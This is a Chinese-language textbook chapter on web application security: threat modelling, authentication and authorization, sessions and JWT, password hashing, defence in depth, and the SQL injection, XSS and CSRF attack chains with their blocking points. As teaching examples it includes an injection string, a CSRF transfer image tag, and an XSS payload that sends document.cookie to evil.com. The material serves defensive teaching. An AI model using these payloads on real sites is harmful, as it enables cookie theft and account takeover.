# 安全基础

前八篇把交付链路立完：06-架构分层篇遍历了请求全链路事务环——浏览器装配报文、DNS 解析、TLS 建通道、负载均衡与网关裁决、应用执行规则、数据层落库，响应原路返回闭合事务环；07-数据库基础篇下钻了环的终点数据层；08-微服务架构篇把环放大到服务间拓扑。本篇是本章收口，换成对抗视角把同一条环重走一遍：环上每个功能节点，同时是攻击面。消费三处既有结论并就地闭合：05-计算机网络 06 篇的传输层安全（Transport Layer Security，TLS）已把线上字节的窃听、篡改、冒充三种攻击封死在通道层——传输安全就此闭合，本篇只管进了应用之后的字节；05-计算机网络 05 篇的 Cookie 语义（服务端以 `Set-Cookie` 下发、浏览器按域存储、此后同域请求自动回传）是本篇凭证机制的底座；07 篇的数据层是注入攻击的终点站——07 篇立过的索引、事务与权限账，在本篇全部成为被攻击对象。产出是一套应用层威胁模型与纵深防御。

全篇核心断言一句：**攻击的本质是让数据被解释器误当指令，防御在解释边界把数据与指令重新分开。** 解释器——SQL 引擎、HTML/JS 渲染引擎、命令行 Shell——都按固定语法吞字节，语法层与数据层的分离是它们正常工作的前提；攻击要做的只有一件事：把恶意数据送到解释器面前，让它跨过那条界。三条高发攻击链共用这个因果结构：SQL 注入沿 SQL 语句环行进，XSS（Cross-Site Scripting，跨站脚本）沿页面渲染环行进，CSRF（Cross-Site Request Forgery，跨站请求伪造）沿浏览器自动携带凭证环行进——没有一条另开通道。本章四节按因果排开：先列清单画边界（第一节威胁建模），再立身份与权限的机制链（第二节），然后沿三条攻击环逐点定阻断位（第三节），最后把全部防御排成互不依赖的独立防线（第四节纵深防御）。

## 一、威胁建模：按资产与信任边界列清单

### 1. 资产、入口与 STRIDE 检查表

威胁建模的第一步不是收集攻击手法，而是列清单：先定资产——要护什么（用户凭证、业务数据、服务可用性），再定入口——数据从外部进入系统的每一个点，最后逐入口枚举威胁。枚举用 STRIDE 六类作检查表：仿冒（Spoofing，冒充他人身份）、篡改（Tampering，改写数据或代码）、抵赖（Repudiation，做了却可否认）、信息泄露（Information Disclosure，数据到了不该到的地方）、拒绝服务（Denial of Service，DoS，资源被耗尽）、提权（Elevation of Privilege，拿到不该有的权限）。六类覆盖的是被违背的性质，不绑定具体手法——手法年年翻新，性质六类不变，这是它配当检查表的原因。

入口与攻击的对应关系，落在 06 篇图② 的请求事务环上。图① 在同一条环上叠加对抗面标注：

```text

【】内为节点职能，▸后为该节点的主要攻击类型；★为传输层已闭合、本篇不管的攻击）

 浏览器
 ┌────────────────────────────────────────────────────────────┐
```

对图遍历：浏览器格子标注两类——页面渲染端是脚本解释器所在地（XSS 的夺权点），凭证保管端是 CSRF 的借用对象；DNS 与网络入口的线上攻击已被 TLS 封死（05-06 的结论单句引用：加密、防篡改、证书链验身份三动作各封一种），剩下的是通道管不到的应用层字节；API 网关承接量的攻击（DoS）与准入裁决；应用层承接内容类攻击——注入与越权，本篇的重头都在这一格与它的下游；数据库格子的第一行标注注入的终点（07 篇的数据层机制在此被夺权），第二行标注最坏结局——拖库，它的兜底归第四节防线。图的每条边都是 06 篇事务环的原有边：攻击不另开通道，这正是全篇核心断言的第一个证据。

六类威胁 × 五个入口逐格枚举，得到检查表全貌：

| 入口 \ 威胁 | S 仿冒 | T 篡改 | R 抵赖 | I 信息泄露 | D 拒绝服务 | E 提权 |
| --- | --- | --- | --- | --- | --- | --- |
| 浏览器（渲染端） | 仿冒登录页骗取口令 | XSS 改写页面 DOM 内容 | 客户端不担追溯职责 | 脚本读走凭证与页面数据 | 恶意脚本死循环占满用户侧资源 | 以用户身份发请求（XSS 冒充操作） |
| DNS / 网络入口 | 假冒服务器钓鱼 | 在途改写报文 | 通道层不涉追溯 | 明文流量被嗅探 | 流量洪泛打满带宽 | 通道层无权限模型，不适用 |
| API 网关 | 伪造或盗用凭证调用 | 中间代理改写请求 | 调用日志不全即无从追责 | 越权读经网关原样返回 | 超量请求耗尽下游资源 | 匿名调用摸到管理接口 |
| 应用层 | 凭证重放冒充他人 | 篡改参数（价格、数量、ID） | 关键操作无留痕即被否认 | 水平越权直读他人数据 | 构造输入触发慢查询占满连接池 | 垂直越权调用管理功能 |
| 数据库 | 内网横移伪造连接来源 | 注入语句改写业务数据 | 无审计日志的操作不可追溯 | 拖库批量导出全表 | 锁表与慢查询拖垮服务 | 应用账号权限过大，注入即得管理员 |

表内读法：入口越靠下游，单次得手的代价越大——网关一格的失手通常是流量或准入问题，数据库一格的失手直接是资产问题；六类中每一格都填了具体威胁，没有空格，这本身就是检查表的使用方式：拿这张表逐格问"这一格我防了吗"，而不是等手法清单更新。

清单列完，威胁在哪里得手有了一个共同前提——下一小节把这个前提抽出来。

### 2. 信任边界：数据每过一次界重新验证

上面每个入口得手的攻击，都跨过了同一个东西：信任边界（Trust Boundary）——代码对数据的信任级别发生跳变的位置。边界内侧的代码默认外侧的数据不可信，反之则不成立。一次请求要跨的边界至少三道：网络 → 应用（外部输入一律不可信）、应用 → SQL 解释器（字符串交给另一个语法体系去解析）、其他用户 → 本页 DOM（别人写的内容渲染进我的页面）。三道边界的守则同一条：数据每跨一次界，必须重新验证、重新定形态——上一次验证过的数据不代表这一次可信，因为在边界另一侧等待它的是另一个解释器。

攻击的本质在这三道边界上现形：让数据被解释器误当指令。SQL 注入是数据跨进 SQL 语法层，XSS 是数据跨进 HTML/JS 语法层，CSRF 稍特别——它借的不是语法层而是凭证回传边（第三节逐一展开）。守住边界的默认姿势有两条。其一，最小权限：每个组件只持完成自身功能所需的最小权限——归因是权限上限决定被攻陷后的损失半径，应用账号只可读写本库三张表，注入得手也拿不到系统表。其二，默认拒绝：不在允许清单里的一律拒绝。允许清单（白名单）与拒绝清单（黑名单）的选择不是工程偏好，是集合完备性的算术：

| 维度 | 黑名单 | 白名单 |
| --- | --- | --- |
| 枚举对象 | 全部坏值 | 全部好值 |
| 集合完备性 | 开放集合——坏值由攻击者创造力定义，枚举不完备 | 封闭集合——好值由应用自身语义定义，写得完 |
| 失效方式 | 一个未列入的坏值即静默穿透 | 未列入的一律拒绝，失效表现为明确的拒绝、可见 |
| 方向结论 | 只作辅助手段 | 默认姿势 |

归因展开一句：黑名单要求穷举"所有坏值"，而坏值的集合没有边界——编码变形、大小写、注释、Unicode 等价形都能造出清单外的新值，清单永远追着攻击者跑；白名单枚举的是应用自己需要的好值，这个集合由业务语义封闭定义——省份只允许三十四个取值，日期只接受一种格式。方向不等式固定：白名单失效即报错可见，黑名单失效即静默放行。

边界与姿势立住之后，还差身份这道门——系统先得知道"请求来自谁、他有权动什么"，第二节立这条机制链。

## 二、认证与授权：两个独立问题的机制链

### 1. 分界表与水平越权

认证（Authentication）回答"你是谁"：验证凭证与身份声明的绑定。授权（Authorization）回答"你能干什么"：判定这个身份对目标资源有无操作权限。两个问题、两套机制、两个失败形态，分界逐格列出：

| 维度 | 认证 | 授权 |
| --- | --- | --- |
| 回答的问题 | 你是谁 | 你能干什么 |
| 输入 | 凭证（口令、会话 ID、令牌） | 已认证的身份 + 目标资源 + 动作 |
| 执行时机 | 会话建立时验证一次，后续每请求核验凭证 | 每次资源访问逐请求判定 |
| 失败形态 | 401 档：身份未证实（05 篇状态码语义） | 403 档：身份已证实、权限不足 |
| 被攻破的典型缺陷 | 凭证泄露、暴力破解 | 越权（水平 / 垂直） |

混为一谈是越权缺陷的源头。水平越权：用户 A 登录后把请求里的 `id=1001` 改成 `1002`，直接读到 B 的订单——认证全程通过，服务端验证了"这是 A"，却没有验证"这份资源属于 A"；垂直越权：低权限用户直接调用管理接口，同样认证通过、授权缺位。动作归因：两者的补法相同——每个资源访问都重新做一次归属与权限判定，服务端以会话里的身份为准计算归属，不信任请求参数里带来的任何 ID 与角色。401 与 403 两档状态码正好把两个问题分开归因：身份没证实走 401，身份证实了权限不够走 403——把 403 错配成 401，客户端就分不清"该重新登录"还是"该换目标"。

认证侧的凭证机制有两条主流形态，先走第一条——服务端有状态的那条。

### 2. 会话机制环：服务端有状态的凭证

会话（session）机制是一条闭环，图② 先行：

```text
图② 会话机制环（视角：凭证生命周期——一次登录与一次后续请求。
服务端持有会话表，凭证本身只是一个无语义的随机 ID）

 登录（时序因果，严格单向推进）：
 ① 客户端提交用户名 + 口令
       ▼
 ② 服务端验证口令（存储形态见 2.4 节）→ 生成高熵随机会话 ID
       │ 会话表写入一行：会话 ID → {用户 ID, 角色, 过期时间}
       ▼
 ③ 响应头 Set-Cookie 下发（05 篇 Cookie 语义：浏览器按域存储）
       │ Set-Cookie: session_id=8f3e…; HttpOnly; Secure; SameSite=Lax
       ▼
 后续每请求（空间事务环，逐请求循环）：
 ④ 浏览器对该域的每个请求自动回传 Cookie——不问请求由哪个页面发起
       ▼
 ⑤ 服务端查会话表：命中且未过期 → 认证通过 → 转入授权判定（2.1 节）
       ▼
 ⑥ 登出或过期：删除表项——同一 ID 立即失效（吊销 = 删一行）
```

逐边遍历：①→③ 是登录段，凭证的语义全在服务端——会话 ID 是高熵随机数（随机到不可猜测，而不是可从用户信息推导的值），它指向的会话表行才携带身份与角色；③ 的 `Set-Cookie` 上有三个属性，各自是一道防线，归因在此预付、第三节的攻击链兑现：`HttpOnly` 禁止脚本读取该 Cookie（XSS 偷不走），`Secure` 限制只在加密连接上回传（明文通道不带），`SameSite` 限制跨站请求是否携带（CSRF 的借用边在此断开）。④→⑤ 是每请求循环：浏览器按域自动回传是 05 篇立过的 Cookie 语义，服务端付出的是每次一次查表——会话表在进程内为纳秒到微秒档，外置集中存储（08 篇无状态部署的形态）则是一次跨网络往返毫秒档。⑥ 是吊销段：删一行表项，凭证即刻作废——这是有状态形态最大的机制优势，记住它与 2.3 节的对照。

可实操核验：真实下发的 Set-Cookie 一条命令读回——

```console
$ curl -si https://example.com/login -d 'user=a&pass=b' | grep -i set-cookie
Set-Cookie: session_id=8f3e2a1c…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

浏览器开发者工具的 Application（应用）面板 → Cookies 里逐属性核对：`HttpOnly` 列打勾表示脚本不可读，`Secure` 表示仅 HTTPS 连接回传，`SameSite` 列显示跨站携带策略——三个属性的取值直接对应第三节的 XSS 与 CSRF 两条攻击链的阻断开关。

会话环的每一笔都依赖服务端的那张表——表是它的优势（吊销容易）也是它的成本（每请求查表、多副本需共享）。第二条形态把表整个甩掉，代价换到别处。

### 3. JWT：自包含凭证与吊销代价

JWT（JSON Web Token）把凭证做成自包含：声明（用户 ID、角色、过期时间）直接编码在令牌里，配一段签名防篡改。结构固定三段，以 `.` 相连，各段 Base64URL 编码：

```text
eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTkwMDAwMDB9 . 4AdcjZZm2…（签名）
└── 头部 Header ──┘  └──────────── 载荷 Payload ────────────────────┘  └──── 签名 Signature ────┘
```

验证动作只有一次本地运算：服务端用自己的密钥对前两段重算签名，与第三段比对——一致即通过，全程不查表。08 篇无状态部署的"令牌自带"形态正是它：任一副本持同一密钥即可独立验证，扩容不需要共享任何会话状态。

可实操核验：前两段是明文编码，直接可解——

```console
$ echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
{"alg":"HS256"}
$ echo 'eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTkwMDAwMDB9' | base64 -d
{"sub":"1001","role":"user","exp":1799000000}
```

这次解码本身就是一条安全结论：Base64URL 是编码不是加密——任何拿到令牌的人都能读出全部载荷（上面两行就是全部门槛），敏感数据不得放进载荷；令牌的完整性由签名保证（改了载荷没有密钥就签不出匹配的第三段，验证即失败），保密性则完全没有，两件事在此分开记账。

代价在吊销侧：签名有效即有效，直到 `exp` 过期——服务端不查表，也就无处记录"这个令牌已废"，登出与封禁都拦不住已发出的令牌；要吊销就得另建黑名单存储，无状态省下的表又部分付了回去。典型折中是把有效期压到分钟档、配刷新令牌（refresh token，用于换取新 JWT 的长效凭证，只出现在刷新接口）分摊重新登录的成本。两条形态的全部对照落格：

| 维度 | 会话（session） | JWT |
| --- | --- | --- |
| 凭证形态 | 随机 ID，自身无语义 | 自包含签名串，载荷携带全部声明 |
| 状态存储位置 | 服务端会话表（有状态） | 无表，声明随令牌走（无状态） |
| 每请求验证方式 | 查会话表比对 | 重算签名比对，本地一次运算 |
| 每请求开销 | 进程内查表纳秒到微秒档；外置存储一次毫秒档往返 | 微秒档哈希运算，无网络往返 |
| 吊销能力 | 删表项即失效，立即可吊销 | 有效至 exp，吊销需另建黑名单 |
| 多副本扩展性 | 需集中存储共享会话 | 任一副本持同一密钥即可独立验证 |
| 失窃后果 | 冒用至会话过期或被吊销 | 冒用至令牌过期，且无法单独吊销 |
| 典型缺陷面 | CSRF：Cookie 自动回传被借用（第三节） | 载荷对任何持有者可读；泄露即冒用 |

表内读法：两列的差全部由一个结构事实推出——状态放在哪边。状态在服务端（session），吊销与失效就归服务端管，代价是每请求查表与多副本共享；状态在凭证里（JWT），验证就免查表、扩展就免共享，代价是吊销失效与载荷可读。没有全局最优，按"要不要即时吊销、要不要无状态扩容"两个问题选型。

身份与权限的机制链立住了，还剩两块地基：权限怎么组织、口令怎么存。

### 4. 授权模型与密码存储

授权模型以 RBAC（Role-Based Access Control，基于角色的访问控制）为默认形态：角色即权限的命名集合，用户挂角色、角色挂权限，判定一次完成——查该用户的角色集合是否包含目标权限。归因：直接维护用户 × 权限矩阵是 N × M 量级的授权关系，角色把它拆成 N + M 量级的两级映射，权限调整改在角色上一次生效。

密码存储是认证侧最后的底座，它的威胁模型要先看清：在线爆破有接口限速与失败锁定兜底（网关与应用层的既有防线），真正的敞口是离线爆破——图① 数据库格子的信息泄露（拖库）一旦发生，口令哈希整表落入攻击者手中，此后每秒可试的次数只受他的硬件限制，服务端任何限速都不再起作用。防御动作两个，方向写死：其一，加盐（salt，每用户一个随机公开值，拼进口令再哈希）——同一口令在不同用户下哈希不同，攻击者预计算的彩虹表（Rainbow Table，对全部常见口令预先算好的哈希反查表）整套作废，表没法预计算就无法复用；其二，慢哈希（bcrypt、Argon2 这类故意设计成慢的函数，单次验证十毫秒到百毫秒档）——把验证方自己的一次哈希从快哈希的纳秒档人为拉高数个数量级，攻击者的每次口令猜测跟着同倍变慢，离线爆破速率从快哈希下 GPU（Graphics Processing Unit，图形处理器）每秒数十亿次档直落为慢哈希下每秒万次档（方向不等式，典型量级）。验证方一次登录多付百毫秒档，换来攻击者每个猜测同价——这笔成本转移就是加盐慢哈希的全部意义。

身份与权限两条链立完，第三节让攻击者上场：不破译、不绕认证，沿正常请求环把恶意数据送进解释器。

## 三、三条高发攻击因果链与阻断点

三条链共用同一个因果骨架：恶意输入沿正常请求边进入 → 穿过若干层 → 到达某个解释器 → 数据被当指令执行；防御在解释边界设阻断点。以下三图共用 ✂ 标记阻断点——每个 ✂ 切断一条具体的边，不是抽象的"注意安全"。

### 1. SQL 注入：拼接处的解释器夺权

```text
图③ SQL 注入因果链（视角：一条恶意输入沿 SQL 环的生命周期；
✂ 为防御阻断点，每个阻断点切断一条具体的边）

 ① 恶意输入：登录表单口令框填入   ' OR '1'='1
      │ 沿正常表单提交边进入系统——攻击不另开通道
      ▼
 ② 应用层：字符串拼接
      │ "…WHERE name='" + name + "' AND pass='" + pass + "'"
      │ ✂ 阻断点 A：参数化查询——结构与数据在拼接之前分离（本节正题）
      ▼
 ③ SQL 解释器：解析语句结构
      │ 拼进来的 '1'='1 改写了 WHERE 条件的布尔结构
      │ ——数据在此被解释成指令（夺权点）
      ▼
 ④ 数据库执行：条件恒真 → 逐行判定全部通过
      ▼
 ⑤ 结果返回：免口令登录；或 UNION 子句带出任意表、分号后追加写语句
      ✂ 阻断点 B（兜底）：数据库账号最小权限——夺权后的损失半径受限（2.4 节姿势 + 第四节防线）
```

逐边遍历：①→② 沿的是正常表单边，输入过滤拦不住它——`' OR '1'='1` 单看是一个合法字符串，恶意性只在被拼接之后才出现；②→③ 是唯一的夺权边：拼接让数据进入了 SQL 语法层，解释器分不清引号里哪段是开发者写的条件、哪段是用户填的值，语法结构的裁决权整体易手；③→④⑤ 是夺权后的自由执行，UNION 读任意表、分号追加写语句，07 篇立的数据层机制全数沦为攻击者的工具。阻断点 A 选在 ②→③ 这条边的源头——参数化查询（Parameterized Query，又称预编译）：语句结构先发给解释器定形，数据后到、只走值通道，从头到尾不接触语法层。可实操核验，拼接与参数化前后同一次登录的实际 SQL 对比——

```sql
-- 拼接形态（可注入）：输入 ' OR '1'='1 后数据库实际收到的语句
SELECT * FROM users WHERE name='admin' AND pass='' OR '1'='1';
-- 与运算优先于或运算：(name='admin' AND pass='') OR ('1'='1')
-- 后半恒真 → 整个 WHERE 恒真 → 全表逐行返回，口令校验形同虚设

-- 参数化形态：结构定形，数据只走值通道
PREPARE login(text, text) AS
  SELECT * FROM users WHERE name = $1 AND pass = $2;
EXECUTE login('admin', ''' OR ''1''=''1');
-- 全部输入落进一个字符串值参与等值比较，比较失败返回 0 行
-- 语义变化：拼接时输入改写结构；参数化时输入只是值——夺权边不存在
```

两段对比的核心差异读得见：拼接形态下输入出现在语法层（引号配对、布尔运算符都被解释），参数化形态下同样的输入只是 `$2` 的值、整体一个字符串。ORM（Object-Relational Mapping，对象关系映射）把参数化封装进默认 API——`where(name=:n, pass=:p)` 底层就是预编译——但它是封装不是新机制：任何允许传原生 SQL 片段的口子（拼接排序字段、动态表名）都重新打开 ②→③ 那条边，因果结构不变，只是默认路径安全了。阻断点 B 是 2.4 节最小权限姿势在数据层的落地，它的完整防线位置在第四节表格里。

注入链阻断在语句结构定形处。第二条链的夺权点移到浏览器，防御随之移到输出端。

### 2. XSS：输出端解释边界的失守

XSS（Cross-Site Scripting，跨站脚本）的夺权解释器是浏览器——图① 浏览器格子的第一行。以存储型 XSS 为例，图④ 先行：

```text
图④ XSS 因果链（视角：存储型 XSS——恶意数据沿页面渲染环的生命周期）

 ① 恶意输入：<script>fetch('//evil.com?c='+document.cookie)</script>
      │ 混在评论正文里沿正常发布边提交
      ▼
 ② 数据层：作为普通文本入库（输入端原样保存——见下文归因）
      ▼
 ③ 应用层：渲染评论页时，把该文本原样拼进 HTML 响应
      │ ✂ 阻断点 A：输出编码——按输出上下文转义，< 变 &lt; 失去标签语法
      ▼
 ④ 浏览器：HTML / JS 解释器解析页面
      │ 未编码则 <script> 进入语法层——数据被当指令执行（夺权点）
      ▼
 ⑤ 脚本在受害用户的页面上下文执行：读 DOM、以用户身份发请求
      ✂ 阻断点 B：CSP——只执行白名单来源的脚本，内联与外域脚本被浏览器拒载
      ✂ 阻断点 C：HttpOnly Cookie——脚本即使执行，凭证也读不走（图② 的属性在此兑现）
```

逐边遍历：①→② 恶意数据以普通文本入库——存储型（persistent）与反射型（reflected）在此分岔：存储型入库后在每个看到该内容的用户页面上执行，反射型藏在 URL 参数里、经服务端回显只打击点开链接的人；两型共用 ③→④⑤ 这段。②→③ 的"原样拼进 HTML"是失守边：同样的数据，进 SQL 前要防注入、进 HTML 前要防脚本——这正是第一节第三道信任边界（其他用户 → 本页 DOM）的现场。阻断点 A 的机制值得展开：输出编码不是"过滤危险字符"，而是按数据最终到达的解释器分别转义——HTML 正文上下文转义 `< > &`，HTML 属性上下文转义引号，JS 上下文按 JSON 序列化，URL 上下文校验协议白名单——因为页面里有不止一个解释器，编码必须对准实际到达的那一个；数据在此与语法层重新分开。阻断点 B 是 CSP（Content Security Policy，内容安全策略）：响应头声明脚本来源白名单，如 `Content-Security-Policy: script-src 'self'`，浏览器执行前核对来源，内联与外域脚本拒载——归因：输出编码是应用侧的手工动作，漏一处即失守，CSP 把执行侧的白名单交给浏览器强制核对，漏编一处的载荷在执行层再被拦一次。阻断点 C 复用图② 的 `HttpOnly`：脚本夺权发生，`document.cookie` 也读不到凭证，损失半径从"冒充用户"压缩到"操作当前页面"。

输入端为何不清洗（图④ ② 的归因）：入库时转义是方向错误——同一份数据的输出位置不止一个（HTML 正文、属性、JSON 接口、邮件模板），入库时无法预知，且二次转义会把合法内容改坏；编码的位置因此定在输出端、紧贴解释边界，这与第一节"数据每过一次界重新定形态"同一条守则。三条阻断点的方向合起来一句话：编码消灭语法层的混入，CSP 白名单兜执行，HttpOnly 保凭证——层层独立，正是第四节纵深在单条链上的预演。

第三条链不再注入任何数据——它借用的东西完全合法：浏览器回传凭证的自动性。

### 3. CSRF：借用浏览器的自动凭证

CSRF（Cross-Site Request Forgery，跨站请求伪造）不向目标站注入任何内容，它借用的是 05 篇 Cookie 语义的一条固有性质：浏览器对该域的每个请求自动回传 Cookie，不问请求由哪个页面发起。图⑤ 先行：

```text
图⑤ CSRF 因果链（视角：一条跨站伪造请求借用自动凭证的生命周期。
前提：用户已在 bank.com 登录，浏览器存有该域会话 Cookie）

 ① 用户浏览攻击页 evil.com（正常访问行为，无需任何漏洞）
      ▼
 ② 攻击页内藏自动发起的跨站请求：
      │ <img src="https://bank.com/transfer?to=attacker&amount=10000">
      │ ——用 GET 做状态变更（本就该用 POST，05 篇方法语义在此补课）
      ▼
 ③ 浏览器向 bank.com 发出请求，自动携带该域 Cookie
      │ ✂ 阻断点 A：SameSite=Strict/Lax——跨站发起的请求不带该 Cookie
      ▼
 ④ 服务端：会话有效 → 认作用户本人操作（认证通过，但请求非用户意志）
      │ ✂ 阻断点 B：CSRF Token——表单内嵌服务端下发的随机校验值，
      │   攻击页构造的请求带不上它，服务端比对不过即拒
      ▼
 ⑤ 状态被改：转账执行 / 资料被改 / 密码被换
```

逐边遍历：①→② 全程合法——攻击页没有利用目标站任何代码缺陷，它利用的是协议语义；②→③ 是借用边：Cookie 按域回传而不是按发起页过滤，evil.com 的页面发出的 bank.com 请求照样带着 bank.com 的凭证；③→④ 是裁决失误边：服务端只验了"凭证有效"（认证），没验"这是用户本人的意志"——CSRF 因此是把第一节那对问题的混同翻到另一个方向：认证一过就当请求可信。阻断点 A 在浏览器侧：`SameSite` 属性（图② 预付的第三个属性）让跨站发起的请求默认不带 Cookie，借用边在浏览器处直接断开；阻断点 B 在服务侧：登录后由服务端生成随机校验值、注入本站每个表单，提交时强制比对——攻击页能构造请求却构造不出值（它读不到目标站页面内容，跨站读响应被同源策略（Same-Origin Policy，浏览器禁止脚本读取非同源响应的隔离规则）挡住），比对自然不过。两个阻断点各断一条边：A 断"凭证到达"，B 断"合法构造"，纵深又预演了一次。

与 XSS 的分水岭一句话钉死：CSRF 借身份不读响应——它只求请求发生、状态被改，读不到任何返回内容（同源策略拦着）；XSS 直接在目标页面上下文执行脚本，读写一切。所以 CSRF 偷不走数据、只能伪造状态变更，XSS 两样都要——防御的侧重点也因此不同：CSRF 阻断凭证的借用（SameSite / Token），XSS 阻断脚本的解释（编码 / CSP / HttpOnly）。

三条链至此走完，收口在同一句话上：攻击沿正常请求环行进——表单提交、评论渲染、跨站图片，没有一条另开通道；防御全部落在解释边界——SQL 解释器前的参数化、HTML/JS 解释器前的输出编码、凭证回传边上的 SameSite 与 Token。防线不是更复杂的协议，而是已有环路上的数据与指令分离。单条链上的三个阻断点各自独立成立，这个"独立"正是最后一节的组织原则。

## 四、纵深防御：层层独立防线

### 1. 五道防线的职责矩阵

前三节每条链都给了多个阻断点，把它们按系统层级排开，得到纵深防御（Defense in Depth）的完整队形。纵深的定义只有一句：每层防线的设计前提是上一层已经被突破——各层独立成立，不共用同一把钥匙、不做同一个假设。防线逐层落格：

| 防线 | 承担机制 | 阻断的威胁 | 上层失守后的兜底动作 |
| --- | --- | --- | --- |
| 网络（通道层） | TLS 加密与身份验证、防火墙与安全组的端口收敛 | 线上窃听、篡改、冒充（05-06 已闭合）、非开放端口的直连探测 | 进不了未开放端口；但 TLS 不看应用字节——恶意载荷照样放行到应用 |
| 网关（入口层） | 限流、认证与鉴权统一裁决、WAF（Web Application Firewall，Web 应用防火墙）规则 | DoS 流量、未认证请求、已知攻击特征 | 挡住批量与无凭证流量；绕过 WAF 特征的变形载荷仍会到达应用 |
| 应用（逻辑层） | 输入白名单验证、参数化查询、输出编码、CSRF Token | 注入、XSS、CSRF、越权 | 应用全失守时，攻击者拿到的只是数据库账号的权限——受下一层约束 |
| 数据（资产层） | 数据库账号最小权限、口令加盐慢哈希、敏感字段加密存储 | 夺权后的批量导出、拖库、口令离线爆破 | 整库被拖时，密文与慢哈希仍拉高资产变现成本（2.4 节的方向结论） |
| 监控审计（事后层） | 异常日志、告警、操作留痕 | 不阻断任何攻击——回答"发生了什么、从哪进、影响多大" | 缩短攻击驻留时间，为其余四层的补漏定位入口 |

逐行遍历，"上层失守后的兜底"一列就是纵深定义的具体化：第一行 TLS 封通道但按设计不看应用字节（05-06 的既有结论——它防的是线上的窃听篡改冒充，不是载荷的内容），所以需要第二行网关做通用裁决；网关做的是量与准入的通用判断，不懂业务语义，所以需要第三行应用层做内容级的分离（参数化、编码、Token——第三节的全部阻断点住在这里）；应用层防线是手工动作，编码漏一处、白名单少列一项都可能发生，所以第四行数据层自持最小权限与慢哈希，不指望上游永远正确；任何一层的失手都需要被看见，第五行监控审计不拦任何东西、专管看见——五行的兜底链条本身构成一条因果链：上一层的能力边界恰好是下一层的存在理由。

这张表同时是第三节的收口：注入、XSS、CSRF 的阻断点全部住在应用行，SameSite 住在网关与会话属性上，最小权限住在数据行，DoS 的第一道闸住在网关行——单链视角的阻断点在系统视角里各就各位。

### 2. 可用性威胁与全章回看

三条攻击链之外还剩一类：DoS（Denial of Service，拒绝服务）——图① 网关格子的第一行、第一节 STRIDE 的 D 类。它不注入、不借身份，直接耗尽资源：带宽、连接数、连接池、CPU，对应 STRIDE 检查表里网关与应用行已填的那两格。与 08 篇的衔接在此单句闭合：08 篇的限流把超阈值请求拒在网关、熔断器防止故障沿同步环扩散——同一套机制在安全语境下就是可用性防护的现成组件，DoS 是资源耗尽型威胁，限流与熔断正是按量与按故障隔离的对策，本篇不重展。至此五道防线各就各位，安全机制的账目与前三篇的交付机制全部对上。

全章在威胁模型处闭合。回头看本章四节：一节列清单、画边界——资产、入口、六类威胁、三道信任边界，把"防什么"变成可逐格核对的表；二节立机制链——认证与授权分开判、会话与 JWT 按状态位置对账、口令沉进加盐慢哈希；三节沿三条攻击环逐点定阻断——参数化、输出编码、SameSite 与 Token，每条链收口在"数据与指令在解释边界分离"这同一句因果上；四节把全部防御排成五道独立防线，每层以上一层的失守为设计前提。再往外看一层：计算机网络给了链路——报文如何跨越物理边界从 A 到 B、明文字节如何升级为加密通道；软件工程给了交付——功能如何组织成层与域、沿请求事务环端到端落地；安全给了对抗视角——同一条环、同一批节点，从"怎么让它工作"翻转为"怎么让它被滥用"，于是每个解释边界既是功能所在，也是攻防相遇的地方。三个视角共用同一条拓扑，这是本章以安全收口的原因。
